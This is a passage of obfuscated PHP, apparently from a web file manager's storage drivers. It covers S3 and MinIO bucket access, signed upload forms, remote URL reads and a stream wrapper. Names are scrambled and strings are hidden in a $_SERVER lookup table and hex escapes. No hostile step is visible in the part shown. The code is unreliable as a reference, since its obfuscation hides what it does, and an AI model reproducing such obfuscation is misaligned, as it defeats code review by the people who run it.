$›à•‹¡Ä = count(array_unique($›à•‹¡Ä)); return array($Ñî¾æÅ[239] => $¨µ„¤ÄĞ, $Ñî¾æÅ[240] => $›à•‹¡Ä); } return !1; } public function listAll($İ…‰±ïÍ) { $ûñºÙ‰” =& $_SERVER[¢ñàß¿€]; $¶¬†ŒÉ™ = $this->fileList($İ…‰±ïÍ, $ûñºÙ‰”[12], !0); $ø¨Ï›”¸ = array_to_keyvalue($¶¬†ŒÉ™[$ûñºÙ‰”[86]], $ûñºÙ‰”[32]); foreach ($¶¬†ŒÉ™[$ûñºÙ‰”[85]] as $›ÙÎ¦¡á) { if (is_string($›ÙÎ¦¡á)) { $ø¨Ï›”¸[$›ÙÎ¦¡á] = array($ûñºÙ‰”[79] => 0); } } return $this->listAllFiles($İ…‰±ïÍ, $ø¨Ï›”¸); } public function canRead($’µùÃ¿) { $ı¾ÅùÇ =& $_SERVER[¢ñàß¿€]; $³€ßæûï = $this->client->getAccessControlPolicy($this->bucket, $’µùÃ¿); if (!$³€ßæûï) { return !1; } return in_array($³€ßæûï, array($ı¾ÅùÇ[241], $ı¾ÅùÇ[242], $ı¾ÅùÇ[243])) ? !0 : !1; } public function canWrite($˜Æ¼ãË) { $‹ÂûœÌ€ =& $_SERVER[¢ñàß¿€]; $ôéæÄ— = $this->client->getAccessControlPolicy($this->bucket, $˜Æ¼ãË); if (!$ôéæÄ—) { return !1; } return in_array($ôéæÄ—, array($‹ÂûœÌ€[241], $‹ÂûœÌ€[242])) ? !0 : !1; } public function getContent($ˆ­à’Û) { return $this->client->getObject($this->bucket, $ˆ­à’Û); } public function setContent($‡ö×šÖ, $òô­¥ßÌ = '', $ìœˆÏ» = false) { $é™ŞÙ· =& $_SERVER[¢ñàß¿€]; $‡ö×šÖ = $ìœˆÏ» ? trim($‡ö×šÖ, $é™ŞÙ·[8]) . $é™ŞÙ·[8] : $‡ö×šÖ; $¯ä‹ÎŠ = get_file_mime(get_path_ext($‡ö×šÖ)); $øÌñ–×œ = $this->client->putObject($òô­¥ßÌ, $this->bucket, $‡ö×šÖ, $é™ŞÙ·[229], array(), $¯ä‹ÎŠ); if (!$øÌñ–×œ) { return !1; } if ($ìœˆÏ») { return !0; } return $øÌñ–×œ ? !0 : !1; } public function fileSubstr($Êõ¢æá¯, $ùÈ³¢í, $ŞïÁÅÊœ) { $Ã—Áúò§ = $ùÈ³¢í + $ŞïÁÅÊœ - 1; return $this->client->getObject($this->bucket, $Êõ¢æá¯, array($_SERVER[¢ñàß¿€][244] => "\142\171\x74\x65\x73\x3d{$ùÈ³¢í}\x2d{$Ã—Áúò§}")); } public function upload($å°å‚ª¾, $§¿”„äÙ, $ûÓ¯è„ = false, $½Õ»Ê£ = REPEAT_REPLACE) { $ú¤üçè =& $_SERVER[¢ñàß¿€]; $éÜ‚øì· = array($ú¤üçè[245] => @md5_file($§¿”„äÙ)); $ÅŸÈ¤ßµ = array($ú¤üçè[246] => get_file_mime(get_path_ext($å°å‚ª¾))); if (IO::size($§¿”„äÙ) <= 1024 * 1024 * 200) { $»Â§…Ó¾ = $this->client->putObjectFile($§¿”„äÙ, $this->bucket, $å°å‚ª¾, $ú¤üçè[229], $éÜ‚øì·, $ÅŸÈ¤ßµ); return !empty($»Â§…Ó¾) ? $this->getPathOuter($å°å‚ª¾) : !1; } $»“°ÙÚ = $this->client->multiUploadObject($§¿”„äÙ, $this->bucket, trim($å°å‚ª¾, $ú¤üçè[8]), $éÜ‚øì·, $ÅŸÈ¤ßµ); return $»“°ÙÚ ? $this->getPathOuter($å°å‚ª¾) : !1; } public function download($Ùµ›ôœ¸, $ÊÈ¶Öëş) { if (!@is_dir($this->pathFather($ÊÈ¶Öëş)) && !IO::mkdir($this->pathFather($ÊÈ¶Öëş))) { return !1; } $¨Í…˜—º = $this->client->getObject($this->bucket, $Ùµ›ôœ¸, array(), $ÊÈ¶Öëş); return $¨Í…˜—º !== !1 ? $ÊÈ¶Öëş : !1; } public function link($ä§Ü»ô¾, $ÏÇÆáŠÙ = array()) { $¨ó¡Á÷˜ =& $_SERVER[¢ñàß¿€]; if ($this->signVer == $¨ó¡Á÷˜[247]) { return $this->client->getAuthenticatedURL($this->bucket, $ä§Ü»ô¾, 3600 * 12, $ÏÇÆáŠÙ); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($ä§Ü»ô¾, $¨ó¡Á÷˜[8]), 3600 * 12, $this->region, array(), !0, $ÏÇÆáŠÙ); } public function fileOut($¬®¶Ó˜«, $òôİ‚Ó½ = false, $ÄœÔ‰õ„ = false, $±¢¶ƒÍÊ = '') { $´¾Æ¡àÛ =& $_SERVER[¢ñàß¿€]; if ($this->isFileOutServer()) { return $this->fileOutServer($¬®¶Ó˜«, $òôİ‚Ó½, $ÄœÔ‰õ„, $±¢¶ƒÍÊ); } if (!$ÄœÔ‰õ„) { $ÄœÔ‰õ„ = $this->pathThis($¬®¶Ó˜«); } $Ë­Ó×Ø“ = get_file_mime(get_path_ext($ÄœÔ‰õ„)); if ($Ë­Ó×Ø“ == $´¾Æ¡àÛ[248]) { return parent::fileOut($¬®¶Ó˜«, $òôİ‚Ó½, $ÄœÔ‰õ„, $±¢¶ƒÍÊ); } $ÍÍÉÊˆü = array($´¾Æ¡àÛ[249] => $Ë­Ó×Ø“); if ($òôİ‚Ó½) { $ÍÍÉÊˆü[$´¾Æ¡àÛ[250]] = $´¾Æ¡àÛ[251] . rawurlencode($ÄœÔ‰õ„); } else { } $øµ‰´«’ = $this->link($¬®¶Ó˜«, $ÍÍÉÊˆü); $this->fileOutLink($øµ‰´«’); } public function fileOutServer($ËıÃ˜, $Õ¼Ì Ò = false, $©›Šûåì = false, $ùŸğ­” = '') { parent::fileOut($ËıÃ˜, $Õ¼Ì Ò, $©›Šûåì, $ùŸğ­”); } public function fileOutImageServer($ì˜šÙŒü, $á‘Ä”ïº = 250) { parent::fileOutImage($ì˜šÙŒü, $á‘Ä”ïº); } public function hashMd5($îö²¬Ù, $ˆõ×ÂÈæ = '') { $°Õ¸Ÿªâ = $this->objectMeta($îö²¬Ù); if (!$°Õ¸Ÿªâ) { return !1; } $ˆõ×ÂÈæ = $ˆõ×ÂÈæ ? $ˆõ×ÂÈæ : _get($°Õ¸Ÿªâ, $_SERVER[¢ñàß¿€][252]); return $ˆõ×ÂÈæ; } public function uploadFormData($ñÍ«÷ñø, $Íş‡”Œ = 3600) { $ ş™õ¸† =& $_SERVER[¢ñàß¿€]; $…‰ß³é = $this->pathFather($ñÍ«÷ñø); $Êü²àŸ¸ = $this->client->getHttpUploadPostParams($this->bucket, $…‰ß³é, $ ş™õ¸†[229], $Íş‡”Œ); return array_merge((array) $Êü²àŸ¸, array($ ş™õ¸†[208] => $this->getHost())); } public function multiUploadFormData($¦ÕÎ¥¿É, $™Ã¥ÈğŠ = 3600) { $İÜ¯È¦† =& $_SERVER[¢ñàß¿€]; $ºƒš»˜¶ = gmdate($İÜ¯È¦†[253]); $ÛÛ€Ø€Š = array(); $áñ¥ş¢ = $this->client->getUploadId($this->bucket, $¦ÕÎ¥¿É, $ÛÛ€Ø€Š); if (!$áñ¥ş¢) { return !1; } return array($İÜ¯È¦†[254] => $áñ¥ş¢, $İÜ¯È¦†[208] => $this->getHost() . $İÜ¯È¦†[8] . $this->pathEncode($¦ÕÎ¥¿É), $İÜ¯È¦†[255] => $ºƒš»˜¶, $İÜ¯È¦†[97] => $¦ÕÎ¥¿É); } public function multiUploadAuthData($î”¼¸û¨, $ÙøşÄâ£ = array()) { $÷ºŒãŞ =& $_SERVER[¢ñàß¿€]; $ï˜‹úÁ® = isset($ÙøşÄâ£[$÷ºŒãŞ[255]]) ? $ÙøşÄâ£[$÷ºŒãŞ[255]] : gmdate($÷ºŒãŞ[253]); $ä¤ÖÕ = isset($ÙøşÄâ£[$÷ºŒãŞ[169]]) ? $ÙøşÄâ£[$÷ºŒãŞ[169]] : $÷ºŒãŞ[12]; $¦›ûƒ™İ = $ÙøşÄâ£[$÷ºŒãŞ[97]]; unset($ÙøşÄâ£[$÷ºŒãŞ[97]]); if (isset($ÙøşÄâ£[$÷ºŒãŞ[256]])) { $ÙøşÄâ£[$÷ºŒãŞ[255]] = $ï˜‹úÁ®; return $this->listUploadParts($¦›ûƒ™İ, $ÙøşÄâ£); } $Òˆ´ÛõÙ = array($÷ºŒãŞ[257], $÷ºŒãŞ[12], $÷ºŒãŞ[123], $÷ºŒãŞ[12], "\x78\x2d\141\155\x7a\55\144\141\x74\145\x3a{$ï˜‹úÁ®}", $÷ºŒãŞ[8] . $this->bucket . $÷ºŒãŞ[8] . $this->pathEncode($¦›ûƒ™İ) . $ä¤ÖÕ); if (strpos($ä¤ÖÕ, $÷ºŒãŞ[258]) === 0) { $Òˆ´ÛõÙ[0] = $÷ºŒãŞ[259]; } if (isset($ÙøşÄâ£[$÷ºŒãŞ[260]]) && $ÙøşÄâ£[$÷ºŒãŞ[260]] == $÷ºŒãŞ[261]) { $Òˆ´ÛõÙ[0] = $÷ºŒãŞ[261]; } $ŞÈÑ“¼– = implode($÷ºŒãŞ[262], $Òˆ´ÛõÙ); $²Óáş¤ = base64_encode(hash_hmac($÷ºŒãŞ[263], $ŞÈÑ“¼–, $this->secret, !0)); $ëàôËô© = $÷ºŒãŞ[264] . $this->accessKey . $÷ºŒãŞ[4] . $²Óáş¤; if (strpos($ä¤ÖÕ, $÷ºŒãŞ[258]) === 0) { return array($÷ºŒãŞ[265] => $ëàôËô©, $÷ºŒãŞ[255] => $ï˜‹úÁ®); } return $ëàôËô©; } public function listUploadParts($ÓöÇĞÈ, $§Í¾…Š = array()) { $¶Àö¯É¿ =& $_SERVER[¢ñàß¿€]; $ò˜î’ßú = str_replace($¶Àö¯É¿[266], $¶Àö¯É¿[12], $§Í¾…Š[$¶Àö¯É¿[169]]); $²œûÎ¾ı = $this->client->listParts($this->bucket, $ÓöÇĞÈ, $ò˜î’ßú); if (!$²œûÎ¾ı) { return !1; } unset($§Í¾…Š[$¶Àö¯É¿[256]], $§Í¾…Š[$¶Àö¯É¿[260]]); $§Í¾…Š[$¶Àö¯É¿[97]] = $ÓöÇĞÈ; $ÆËÄ”Œ¢ = $this->multiUploadAuthData($ÓöÇĞÈ, $§Í¾…Š); if (empty($ÆËÄ”Œ¢)) { return !1; } return array($¶Àö¯É¿[265] => $ÆËÄ”Œ¢, $¶Àö¯É¿[255] => $§Í¾…Š[$¶Àö¯É¿[255]], $¶Àö¯É¿[267] => $²œûÎ¾ı); } public function getHost() { $‰ÔêŞÀı =& $_SERVER[¢ñàß¿€]; $ê÷ÁÏé = parent::getHost(); if (!isset($this->osType)) { $this->osType = $this->getType(); } if (!in_array($this->osType, array($‰ÔêŞÀı[70], $‰ÔêŞÀı[64], $‰ÔêŞÀı[69], $‰ÔêŞÀı[62]))) { return $ê÷ÁÏé . $‰ÔêŞÀı[8] . $this->bucket; } $ê÷ÁÏé = explode($‰ÔêŞÀı[210], $ê÷ÁÏé); return $ê÷ÁÏé[0] . $‰ÔêŞÀı[210] . $this->bucket . $‰ÔêŞÀı[10] . $ê÷ÁÏé[1]; } public function size($€–ãŞŸ˜) { $ÔÌ¨»Çı = $this->objectMeta($€–ãŞŸ˜); return $ÔÌ¨»Çı ? $ÔÌ¨»Çı[$_SERVER[¢ñàß¿€][79]] : 0; } public function info($Ã¨äÎª´) { if ($this->isFolder($Ã¨äÎª´)) { return $this->folderInfo($Ã¨äÎª´); } else { if ($this->isFile($Ã¨äÎª´)) { return $this->fileInfo($Ã¨äÎª´); } } return !1; } public function exist($½ÛÌæˆß) { return $this->isFile($½ÛÌæˆß) || $this->isFolder($½ÛÌæˆß); } public function isFile($Üİ‡ãÏé) { return !$this->isFolder($Üİ‡ãÏé) && $this->objectMeta($Üİ‡ãÏé); } public function isFolder($ËÙ“ˆº) { return $this->cacheMethod($_SERVER[¢ñàß¿€][179], $ËÙ“ˆº); } protected function objectMeta($ïâÖ´Ê¬) { return $this->cacheMethod($_SERVER[¢ñàß¿€][181], $ïâÖ´Ê¬); } protected function _objectMeta($ûæ¯ó¡â) { $ìƒ¢…§Æ =& $_SERVER[¢ñàß¿€]; $ûæ¯ó¡â = rtrim($ûæ¯ó¡â, $ìƒ¢…§Æ[8]); try { $¢âï¤†¿ = $this->client->getObjectInfo($this->bucket, $ûæ¯ó¡â); if (!isset($¢âï¤†¿[$ìƒ¢…§Æ[252]]) && isset($¢âï¤†¿[$ìƒ¢…§Æ[268]])) { $¢âï¤†¿[$ìƒ¢…§Æ[252]] = $¢âï¤†¿[$ìƒ¢…§Æ[268]]; } } catch (Exception $èêÃõÓç) { $¢âï¤†¿ = !1; } if (!$¢âï¤†¿) { } return $¢âï¤†¿; } protected function _isFolder($èˆÖ«èÅ) { $Œ¦ÊÂ€ =& $_SERVER[¢ñàß¿€]; $èˆÖ«èÅ = rtrim($èˆÖ«èÅ, $Œ¦ÊÂ€[8]); if ($èˆÖ«èÅ == $Œ¦ÊÂ€[12] || $èˆÖ«èÅ == $Œ¦ÊÂ€[8]) { return !0; } $÷ÇÂÊû  = $this->client->getBucket($this->bucket, $èˆÖ«èÅ, null, 1); if (empty($÷ÇÂÊû [$Œ¦ÊÂ€[236]])) { return !1; } $öÈÒ‚‘ = $÷ÇÂÊû [$Œ¦ÊÂ€[236]][0][$Œ¦ÊÂ€[32]]; return stripos($öÈÒ‚‘, $èˆÖ«èÅ . $Œ¦ÊÂ€[8]) === 0 ? !0 : !1; if (substr($öÈÒ‚‘, -1) == $Œ¦ÊÂ€[8]) { return !0; } if (get_path_this($öÈÒ‚‘) == get_path_this($èˆÖ«èÅ)) { return !1; } return !0; } public function listObject($ĞÇ¢èÁé) { return $this->fileList($ĞÇ¢èÁé, $_SERVER[¢ñàß¿€][12], !0); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($°ôƒü´Ÿ) { $ğïà„Æ¼ =& $_SERVER[¢ñàß¿€]; parent::__construct($°ôƒü´Ÿ); $this->setSignVersion($ğïà„Æ¼[247]); if (!$this->region) { $this->region = $ğïà„Æ¼[269]; $this->client->setRegion($this->region); } $this->client->setHeadValid(!1); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function checkRegion() { $²´ıÚ´ë = $this->getBucketRgn(); return $this->region == $²´ıÚ´ë ? !0 : !1; } public function uploadFormData($¨ƒö€ÇÌ, $şõ‘›à = 3600) { $İç‹çÙé =& $_SERVER[¢ñàß¿€]; $¼”½¨ œ = $İç‹çÙé[229]; $æ÷±ší = $İç‹çÙé[270]; $¥¦Ö¸Àè = $İç‹çÙé[62]; $È¸Ğš¸º = gmdate($İç‹çÙé[271]); $€öàßÅ‹ = gmdate($İç‹çÙé[272]); $†ØÌ€íÏ = $İç‹çÙé[273]; $Í¸§ºø  = $şõ‘›à . $İç‹çÙé[12]; $íªÑ±åñ = $İç‹çÙé[274]; $’«î›«× = array($this->accessKey, $€öàßÅ‹, $this->region, $¥¦Ö¸Àè, $†ØÌ€íÏ); $×¢£öŞ÷ = implode($İç‹çÙé[8], $’«î›«×); $²œ‰÷ç› = array($İç‹çÙé[275] => gmdate($İç‹çÙé[276], strtotime($İç‹çÙé[277])), $İç‹çÙé[278] => array(array($İç‹çÙé[279] => $this->bucket), array($İç‹çÙé[280] => $¼”½¨ œ), array($İç‹çÙé[281], $İç‹çÙé[282], $İç‹çÙé[12]), array($İç‹çÙé[281], $İç‹çÙé[283], $İç‹çÙé[12]), array($İç‹çÙé[281], $İç‹çÙé[284], $İç‹çÙé[12]), array($İç‹çÙé[285] => $íªÑ±åñ), array($İç‹çÙé[286] => $×¢£öŞ÷), array($İç‹çÙé[287] => $æ÷±ší), array($İç‹çÙé[288] => $È¸Ğš¸º), array($İç‹çÙé[289] => $Í¸§ºø ))); $±ÔÓ€ = base64_encode(json_encode($²œ‰÷ç›)); $ÀßóÛÂ´ = hash_hmac($İç‹çÙé[290], $€öàßÅ‹, $İç‹çÙé[291] . $this->secret, !0); $ğáı—±Û = hash_hmac($İç‹çÙé[290], $this->region, $ÀßóÛÂ´, !0); $™‹±Á… = hash_hmac($İç‹çÙé[290], $¥¦Ö¸Àè, $ğáı—±Û, !0); $õäİ’ŠÌ = hash_hmac($İç‹çÙé[290], $†ØÌ€íÏ, $™‹±Á…, !0); $œ¸¡‡ğ = hash_hmac($İç‹çÙé[290], $±ÔÓ€, $õäİ’ŠÌ); $õ¡ôşˆŒ = array($İç‹çÙé[246] => $İç‹çÙé[12], $İç‹çÙé[292] => $İç‹çÙé[12], $İç‹çÙé[280] => $¼”½¨ œ, $İç‹çÙé[285] => $íªÑ±åñ, $İç‹çÙé[293] => $±ÔÓ€, $İç‹çÙé[294] => $×¢£öŞ÷, $İç‹çÙé[295] => $æ÷±ší, $İç‹çÙé[296] => $È¸Ğš¸º, $İç‹çÙé[297] => $Í¸§ºø , $İç‹çÙé[298] => $œ¸¡‡ğ, $İç‹çÙé[208] => $this->getHost()); return $õ¡ôşˆŒ; } } goto dùšŒ£Ö¸õ; eÌ‹İåÃñè: class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($è÷™Ğõã = false) { } public function exist($§€»€Üâ) { $âéš÷²İ = $this->info($§€»€Üâ); return $âéš÷²İ[$_SERVER[¢ñàß¿€][232]]; } public function isFile($†áŒãìå) { $ÑêÖÀĞ = $this->info($†áŒãìå); return $ÑêÖÀĞ[$_SERVER[¢ñàß¿€][232]]; } public function isFolder($¹ÀğöÀ˜) { return !1; } public function size($ó°¿ºØ) { $ïÕëªçã = $this->info($ó°¿ºØ); return $ïÕëªçã[$_SERVER[¢ñàß¿€][79]]; } public function info($¼“²¸–¢) { return $this->infoParse($¼“²¸–¢); } public function infoAuth($„¸Óî©Ò) { return $this->infoParse($„¸Óî©Ò); } public function infoWithChildren($Î•ˆñğı) { return $this->infoParse($Î•ˆñğı); } public function infoFull($Ã²Ã¡±ƒ) { return $this->infoParse($Ã²Ã¡±ƒ); } private function infoParse($¸Öõé) { $¾â¬»Å© =& $_SERVER[¢ñàß¿€]; $ö»ş§á’ = $this->header($¸Öõé); if (!$ö»ş§á’ || !$ö»ş§á’[$¾â¬»Å©[821]]) { return !1; } $¢üïŞ½ = _get($ö»ş§á’, $¾â¬»Å©[413], 0); $ñÛ¦ƒ“Ø = array($¾â¬»Å©[32] => $ö»ş§á’[$¾â¬»Å©[32]], $¾â¬»Å©[87] => $¸Öõé, $¾â¬»Å©[33] => $¾â¬»Å©[230], $¾â¬»Å©[79] => intval($¢üïŞ½), $¾â¬»Å©[169] => get_path_ext($ö»ş§á’[$¾â¬»Å©[32]]), $¾â¬»Å©[1450] => $¢üïŞ½ > 0 && $ö»ş§á’[$¾â¬»Å©[1603]], $¾â¬»Å©[1451] => !1); return $ñÛ¦ƒ“Ø; } private function header($äˆ¤™Ù) { $ÉŞæà’û =& $_SERVER[¢ñàß¿€]; if (isset(self::$_cacheHeader[$äˆ¤™Ù])) { return self::$_cacheHeader[$äˆ¤™Ù]; } $äÚßŠÈè = isset($GLOBALS[$ÉŞæà’û[1604]]) ? $GLOBALS[$ÉŞæà’û[1604]] : !1; $GLOBALS[$ÉŞæà’û[1604]] = !0; self::$_cacheHeader[$äˆ¤™Ù] = url_header($äˆ¤™Ù); $GLOBALS[$ÉŞæà’û[1604]] = $äÚßŠÈè; return self::$_cacheHeader[$äˆ¤™Ù]; } public function hashSimple($ Îğú¦Â, $Ñçèéî§ = false) { $âû”íÕÔ =& $_SERVER[¢ñàß¿€]; $»é—¾£¿ = $this->info($ Îğú¦Â); if (!$»é—¾£¿ || !$»é—¾£¿[$âû”íÕÔ[232]]) { return !1; } $üåÈÜ¼É = $»é—¾£¿[$âû”íÕÔ[79]]; $Ì§ÖæñÏ = 200; $½®¢›ÏÕ = 50; if ($üåÈÜ¼É <= $Ì§ÖæñÏ * $½®¢›ÏÕ) { return md5($this->fileSubstr($ Îğú¦Â, 0, $üåÈÜ¼É)) . $üåÈÜ¼É; } $‘ ’…Ö÷ = intval($üåÈÜ¼É / $½®¢›ÏÕ); $ÚÊÍæ€µ = $âû”íÕÔ[12]; $Ùõ•Æò° = timeFloat(); $øÎ¸Ã…Ù = 15; for ($®É¦ÄÕÛ = 0; $®É¦ÄÕÛ < $½®¢›ÏÕ; $®É¦ÄÕÛ++) { if (timeFloat() - $Ùõ•Æò° > $øÎ¸Ã…Ù) { return !1; } $ƒÄ¦»¶ = $this->fileSubstr($ Îğú¦Â, $‘ ’…Ö÷ * $®É¦ÄÕÛ, $Ì§ÖæñÏ); if (!$ƒÄ¦»¶) { return !1; } $ÚÊÍæ€µ .= $ƒÄ¦»¶; } $ÚÊÍæ€µ .= $this->fileSubstr($ Îğú¦Â, $üåÈÜ¼É - $Ì§ÖæñÏ, $Ì§ÖæñÏ); return md5($ÚÊÍæ€µ) . $üåÈÜ¼É; } public function getContent($íùûé¦›) { return $this->fileSubstr($íùûé¦›); } public function fileSubstr($‚ı¶ßĞ¤, $×ßËäšÜ = 0, $çöæÖÒ = -1) { $ŒÚáæá¸ =& $_SERVER[¢ñàß¿€]; $¬¾‹Œ•î = $this->info($‚ı¶ßĞ¤); if (!$¬¾‹Œ•î || !$¬¾‹Œ•î[$ŒÚáæá¸[232]] && $¬¾‹Œ•î[$ŒÚáæá¸[79]] > 1024 * 1024 * 10) { return !1; } if ($çöæÖÒ === -1) { $çöæÖÒ = $¬¾‹Œ•î[$ŒÚáæá¸[79]]; } if ($çöæÖÒ == 0) { return $ŒÚáæá¸[12]; } $î¿¸Ë¦Â = array($ŒÚáæá¸[1605] . $×ßËäšÜ . $ŒÚáæá¸[856] . ($×ßËäšÜ + $çöæÖÒ - 1)); $ËõÕ®â = url_request($‚ı¶ßĞ¤, $ŒÚáæá¸[261], !1, $î¿¸Ë¦Â, !1, !1, 30); return $ËõÕ®â[$ŒÚáæá¸[1284]] ? $ËõÕ®â[$ŒÚáæá¸[1284]] : $ŒÚáæá¸[12]; } public function download($¿¬ÅÄÛª, $ÊŸî–ì) { Downloader::start($¿¬ÅÄÛª, $ÊŸî–ì); return $ÊŸî–ì; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($¿ãö°çç, $ÁŞ¯¬ = '') { $this->info = $this->info($¿ãö°çç); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[¢ñàß¿€][87]]; $this->pathOpen = $¿ãö°çç; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$¿ãö°çç])) { self::$_chunkBuffer[$¿ãö°çç] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($à›¼’¨ã) { $Á“ìçµÅ = $this->fileSubstr($this->pose, $à›¼’¨ã); $this->pose += strlen($Á“ìçµÅ); return $Á“ìçµÅ; } public function stream_tell() { return $this->pose; } public function stream_seek($ì×±ÖãÍ, $¥ÆµÒ×) { $˜‘Ôå§ê =& $_SERVER[¢ñàß¿€]; if ($¥ÆµÒ× == SEEK_SET) { $this->pose = $ì×±ÖãÍ; } else { if ($¥ÆµÒ× == SEEK_CUR) { $this->pose += $ì×±ÖãÍ; } else { if ($¥ÆµÒ× == SEEK_END) { $this->pose = $this->info[$˜‘Ôå§ê[79]] + intval($ì×±ÖãÍ); } } } if ($ì×±ÖãÍ < 0) { $this->pose = $this->info[$˜‘Ôå§ê[79]] + $ì×±ÖãÍ; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[¢ñàß¿€][79]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($Íøóëª·, $Òâ€ ı) { $°ÆÒâ =& $_SERVER[¢ñàß¿€]; $‡ãôƒ¸à = $this->info($Íøóëª·); return array($°ÆÒâ[1606] => 0, $°ÆÒâ[1607] => 0, $°ÆÒâ[16] => 32768 + 511, $°ÆÒâ[1608] => 0, $°ÆÒâ[1609] => 0, $°ÆÒâ[1610] => 0, $°ÆÒâ[1611] => 0, $°ÆÒâ[79] => $‡ãôƒ¸à[$°ÆÒâ[79]], $°ÆÒâ[1612] => $‡ãôƒ¸à[$°ÆÒâ[1449]], $°ÆÒâ[1568] => $‡ãôƒ¸à[$°ÆÒâ[88]], $°ÆÒâ[1567] => $‡ãôƒ¸à[$°ÆÒâ[231]], $°ÆÒâ[1613] => 0, $°ÆÒâ[1614] => 0); } static $fileInfo = array(); public function info($™À¼§¼) { $º‘ëˆ‰× = $_SERVER[¢ñàß¿€][1615]; if (isset(self::$fileInfo[$™À¼§¼])) { return self::$fileInfo[$™À¼§¼]; } if (substr($™À¼§¼, 0, strlen($º‘ëˆ‰×)) != $º‘ëˆ‰×) { return !1; } self::$fileInfo[$™À¼§¼] = IO::info(substr($™À¼§¼, strlen($º‘ëˆ‰×))); return self::$fileInfo[$™À¼§¼]; } public static function read($Ñ†‡şÛ¥, $ØÈ¬Àî‹, $½‡Ãù¨Ö) { if (!isset(self::$_fopenCache[$Ñ†‡şÛ¥])) { $Ñıï¤òò = new StreamWrapperIO(); $Ñıï¤òò->stream_open($Ñ†‡şÛ¥); self::$_fopenCache[$Ñ†‡şÛ¥] = $Ñıï¤òò; } $Ñıï¤òò = self::$_fopenCache[$Ñ†‡şÛ¥]; return $Ñıï¤òò->fileSubstr($ØÈ¬Àî‹, $½‡Ãù¨Ö); } public static function _read($Ş©Ôàˆ, $ï¡ğ¾Æß, $Àµòõ»Ø) { $ğœ˜‹ü =& $_SERVER[¢ñàß¿€]; $¿•¾›ÁÓ = fopen($Ş©Ôàˆ, $ğœ˜‹ü[1453]); if (!$¿•¾›ÁÓ) { return $ğœ˜‹ü[12]; } $ÕşäÚ£Ÿ = 8192; fseek($¿•¾›ÁÓ, $ï¡ğ¾Æß, SEEK_SET); $—İ˜ŒÁ = $ğœ˜‹ü[12]; $‹µŠ¹‡ç = 0; while ($‹µŠ¹‡ç < $Àµòõ»Ø) { $Á†ğÊª = min($ÕşäÚ£Ÿ, $Àµòõ»Ø - $‹µŠ¹‡ç); $—İ˜ŒÁ .= fread($¿•¾›ÁÓ, $Á†ğÊª); $‹µŠ¹‡ç += $Á†ğÊª; } fclose($¿•¾›ÁÓ); return $—İ˜ŒÁ; } public function fileSubstr($ğ»ñïæœ, $úŸ¶æ½ê) { $Ç”çÍ’À =& $_SERVER[¢ñàß¿€]; $ÖÁíŒñø = $this->info[$Ç”çÍ’À[79]]; $üİöõ· = $ğ»ñïæœ; $¤ù°ÔĞ = $úŸ¶æ½ê; if ($ğ»ñïæœ < 0) { $ğ»ñïæœ = $ÖÁíŒñø + $ğ»ñïæœ; } if ($úŸ¶æ½ê === !1) { $úŸ¶æ½ê = $ÖÁíŒñø - $ğ»ñïæœ; } if ($ğ»ñïæœ + $úŸ¶æ½ê > $ÖÁíŒñø) { $úŸ¶æ½ê = $ÖÁíŒñø - $ğ»ñïæœ; } if ($úŸ¶æ½ê <= 0) { return $Ç”çÍ’À[12]; } if ($ğ»ñïæœ < 0 || $ğ»ñïæœ >= $ÖÁíŒñø || $úŸ¶æ½ê <= 0 || $úŸ¶æ½ê > 1024 * 1024 * 10) { throw new Exception("\151\157\x46\x69\x6c\x65\122\145\x61\144\x20\145\x72\x72\x6f\x72\41\x20\163\164\141\x72\164\75{$ğ»ñïæœ}\x3b\154\145\x6e\147\164\150\x3d{$úŸ¶æ½ê}\73\x20\163\151\172\145\75{$ÖÁíŒñø}\x3b"); } $ÛÌñßıú = 64 * 1024; $ø·éöş =& self::$_chunkBuffer[$this->path]; if (!$ø·éöş) { $ø·éöş = array(); } $ıú³‘¡Ò = 0; $ğÔíÍÚÎ = 0; $¹÷õå†± = $Ç”çÍ’À[12]; foreach ($ø·éöş as $ıú³‘¡Ò => $¹÷õå†±) { $ıú³‘¡Ò = intval($ıú³‘¡Ò); $ğÔíÍÚÎ = $ıú³‘¡Ò + strlen($¹÷õå†±); if ($ğ»ñïæœ >= $ğÔíÍÚÎ) { continue; } if ($ğ»ñïæœ >= $ıú³‘¡Ò && $ğ»ñïæœ + $úŸ¶æ½ê <= $ğÔíÍÚÎ) { return substr($¹÷õå†±, $ğ»ñïæœ - $ıú³‘¡Ò, $úŸ¶æ½ê); } break; } if (count($ø·éöş) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($Ç”çÍ’À[1616], $Ç”çÍ’À[1617] . count($ø·éöş) . "\x3b\x73\164\x61\162\x74\75{$ğ»ñïæœ}\x2c\154\x65\x6e\x67\x74\x68\75{$úŸ¶æ½ê}\x3b\x70\x6f\x73\145\72{$ıú³‘¡Ò}\x7e{$ğÔíÍÚÎ}"); throw new Exception($Ç”çÍ’À[1618]); } $¥Œè–ª = intval($ğ»ñïæœ / $ÛÌñßıú) * $ÛÌñßıú; $åàîº‰¶ = ceil(($ğ»ñïæœ + $úŸ¶æ½ê) / $ÛÌñßıú) * $ÛÌñßıú - $¥Œè–ª; $å¡ôõ‚ = IO::fileSubstr($this->path, $¥Œè–ª, $åàîº‰¶); $ø·éöş[$¥Œè–ª . $Ç”çÍ’À[12]] = $å¡ôõ‚; ksort($ø·éöş); $³ãü«ÌÜ = substr($å¡ôõ‚, $ğ»ñïæœ - $¥Œè–ª, $úŸ¶æ½ê); return $³ãü«ÌÜ; } private function log($®œÜáŠœ, $”ï³‡¤ã) { $ØÕÆ¿Ä =& $_SERVER[¢ñàß¿€]; $Ô¡ ˆ›ô = timeFloat() - $this->timeStart; write_log(sprintf($ØÕÆ¿Ä[1619], $®œÜáŠœ, $this->info[$ØÕÆ¿Ä[32]], $Ô¡ 